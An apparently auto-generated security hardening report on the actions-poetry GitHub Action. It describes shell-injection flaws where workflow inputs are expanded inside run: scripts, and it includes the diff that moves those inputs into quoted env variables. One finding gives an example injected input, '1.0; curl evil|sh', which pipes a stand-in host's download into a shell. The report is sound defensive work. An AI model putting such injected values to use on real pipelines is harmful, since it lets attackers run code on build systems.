<!-- markdownlint-disable -->

# Hardening Report: abatilo--actions-poetry/v4.0.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `374911c4be584df24e6da57af2d990570ef0f859`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **abatilo--actions-poetry/v4.0.0** was hardened automatically. 5 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a): the input expression is placed directly in the run script: `pipx install poetry==${{ inputs.poetry-version }}`. A caller-supplied poetry-version such as `1.0; curl evil|sh` would run arbitrary shell commands. Fix: move the input into an env: variable (POETRY_VERSION) and write it as "poetry==${POETRY_VERSION}".

Locations:

- `action.yml:29`

### script-injection (severity: high)

Sub-rule (a): the input expression is placed directly in the run script: `ALL_PLUGINS=$(echo "${{ inputs.poetry-plugins }}")`. A value containing `"`, `$(...)` or backticks can run arbitrary commands. Sub-rule (b) also applies: `for PLUGIN in $ALL_PLUGINS` and `poetry self add $PLUGIN` expand values derived from the input without quotes. Fix: pass the input through env: (POETRY_PLUGINS), split it safely with `read -ra` or `xargs`, and quote each value: `poetry self add "$PLUGIN"`.

Locations:

- `action.yml:33`
- `action.yml:35`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.poetry-version }}" appears directly in run: block of step ""; move to env: map

Locations:

- `action.yml:29`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.poetry-plugins }}" appears directly in run: block of step ""; move to env: map

Locations:

- `action.yml:33`

### prior-fix (severity: high)

Carried forward from this version's previous harden, which fixed it; fix it again unless the code no longer has the problem. The previous harden changed action.yml without recording a finding for it, and this analysis reported nothing there. Re-apply its security changes unless the code no longer needs them. The previous patch:
```diff
diff --git a/action.yml b/action.yml
index 68b67c6..00171fb 100644
--- a/action.yml
+++ b/action.yml
@@ -16,6 +16,23 @@ inputs:
 runs:
   using: "composite"
   steps:
     - if: ${{ inputs.poetry-version == 'latest' }}
       run: |
         pipx install poetry
@@ -25,13 +42,21 @@ runs:
         pipx install git+https://github.com/python-poetry/poetry.git@main
       shell: bash
     - if: ${{ inputs.poetry-version != 'latest' && inputs.poetry-version != 'main' }}
+      env:
+        POETRY_VERSION: ${{ inputs.poetry-version }}
       run: |
-        pipx install poetry==${{ inputs.poetry-version }}
+        pipx install "poetry==$POETRY_VERSION"
       shell: bash
     - if: ${{ inputs.poetry-plugins != '' }}
+      env:
+        POETRY_PLUGINS: ${{ inputs.poetry-plugins }}
       run: |
-        ALL_PLUGINS=$(echo "${{ inputs.poetry-plugins }}")
-        for PLUGIN in $ALL_PLUGINS; do
-          poetry self add $PLUGIN
+        plugins=()
+        if [ -n "$POETRY_PLUGINS" ]; then
+          while IFS= read -r -d '' t; do plugins+=("$t"); done \
+            < <(printf '%s' "$POETRY_PLUGINS" | xargs printf '%s\0')
+        fi
+        for PLUGIN in "${plugins[@]}"; do
+          poetry self add "$PLUGIN"
         done
       shell: bash

```

Locations:

- `action.yml`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection, prior-fix

**Notes:**

action.yml: poetry-version moved to env POETRY_VERSION, used as "poetry==${POETRY_VERSION}". poetry-plugins moved to env POETRY_PLUGINS, tokenized with guarded `read -r -d '' -a ... || true` (whitespace/newline split, same as upstream's unquoted for-loop, no quote interpretation), each plugin passed quoted to `poetry self add`.

